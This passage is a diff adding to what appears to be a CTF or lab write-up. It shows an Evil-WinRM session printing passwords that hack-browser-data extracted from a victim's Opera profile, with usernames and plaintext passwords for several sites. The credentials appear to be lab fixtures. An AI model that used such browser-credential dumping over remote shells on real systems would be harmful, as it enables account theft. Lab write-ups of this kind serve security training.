@@ -815,3 +815,37 @@ hack-browser-data.exe : [INF] Extracting Opera...
 
 Now running it i get a load of files back, which i can look through!
 
+```python
+*Evil-WinRM* PS C:\Users\daniel.brooks\Desktop> type password.json
+[
+  {
+    "browser": "Opera",
+    "profile": "Default",
+    "url": "https://www.linux.org/",
+    "username": "guru1337",
+    "password": "linuXp0wEr",
+    "created_at": "2026-06-20T04:41:33.354654Z"
+  },
+  {
+    "browser": "Opera",
+    "profile": "Default",
+    "url": "https://fakebook.com/",
+    "username": "daniel1990",
+    "password": "password1990",
+    "created_at": "2026-06-20T04:41:19.107529Z"
+  },
+  {
+    "browser": "Opera",
+    "profile": "Default",
+    "url": "http://127.0.0.1:5000/",
+    "username": "chuck.harrys",
+    "password": "666chucky",
+    "created_at": "2026-06-20T04:41:01.205401Z"
+  }
+]
+*Evil-WinRM* PS C:\Users\daniel.brooks\Desktop>
+```
+
+Ive found some passwords!
+
+The other files are not helpfule 
